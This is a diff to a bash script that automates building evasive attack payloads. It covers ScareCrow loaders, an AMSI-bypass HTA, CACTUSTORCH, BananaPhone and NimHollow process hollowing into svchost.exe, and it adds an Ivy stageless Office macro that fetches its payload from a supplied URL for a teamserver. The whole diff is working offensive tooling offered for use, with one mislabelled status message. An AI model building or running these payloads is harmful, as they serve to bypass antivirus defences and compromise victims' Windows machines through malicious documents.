@@ -7,7 +7,7 @@ payload32stageless=payload32stageless.bin
 payload32sharp=payload32.cs
 payload64sharp=payload64.cs
 
-#This Script Creates the Following 9 Payloads
+#This Script Creates the Following 10 Payloads
 #ScareCrow JS File using wscript loader(Stageless)
 #ScareCrow JS File using Excel Loader(Stageless)
 #ScareCrow JS File using MSIExec Loader(Stageless)
@@ -17,6 +17,7 @@ payload64sharp=payload64.cs
 #AMSI bypass sharpshooter hta(Staged)
 #Cactus Torch (Staged Payload)
 #NimHollow (Stageless payload)
+#Ivy Macro (Stageless payload
 
 #Run the script and generate the following inside of the created payload directory
 #64 bit Raw staged payload named payload64.bin
@@ -76,6 +77,20 @@ else
 	exit
 fi
 #Tool Check
+
+
+#check for Ivy
+if [[ -d "/root/tools/Ivy" ]]
+	then
+		echo "[+] Ivy payload creation framework ... check"
+	else
+		echo "[+] Ivy payload creation framework ... attempting to install"
+		cd ~/tools && git clone https://github.com/optiv/Ivy.git && cd Ivy
+		go get github.com/fatih/color
+		go get github.com/KyleBanks/XOREncryption/Go
+		go build Ivy.go
+		
+	fi
 
 
 # Check for Nim
@@ -241,7 +256,7 @@ read url
        echo "Copy Complete, Generating BananaPhone Payload"
        cd /root/tools/BananaPhone/example/hideexample/nobanana && GOOS=windows ARCH=amd64 go build -ldflags -H=windowsgui
        cp /root/tools/BananaPhone/example/hideexample/nobanana/nobanana.exe $payload_dir/05-bananascarydonut.exe
-       
+       echo "05-bananascarydonut.exe completed"	 
       
        
        #Create SharpShooter
@@ -270,8 +285,14 @@ read url
        sed -i "29d" /root/tools/CACTUSTORCH/CACTUSTORCH.hta
        sed -i "29iDim code : code = \"$cactus\"" /root/tools/CACTUSTORCH/CACTUSTORCH.hta
        cp /root/tools/CACTUSTORCH/CACTUSTORCH.hta $payload_dir/08-cactus.hta
-       echo "[*] CACTUSTORCH.hta Complete"
+       echo "[*] 08-CACTUSTORCH.hta Complete"
 
        #Create NimHollow Payload
        cd /root/tools/NimHollow && python3 NimHollow.py   $payload_dir/$payload64stageless -i 'C:\Windows\System32\svchost.exe' -o injector --upx --rm
        cp injector.exe  $payload_dir/09-nimhollow.exe
+       echo "[*] 09-CACTUSTORCH.hta Complete"
+
+       #Create 64bit Ivy macro Payload
+	cd /root/tools/Ivy && /root/tools/Ivy/Ivy -Ix64 $payload_dir/$payload64stageless -delivery macro -P Local -O ivy.payload -stageless -url $url > $payload_dir/ivy.macro
+	echo "[*] 10-Ivy Macro Complete. Copy contents of ivy.macro from the payload directory to an office document and upload ivy.payload to the teamserver."
+	
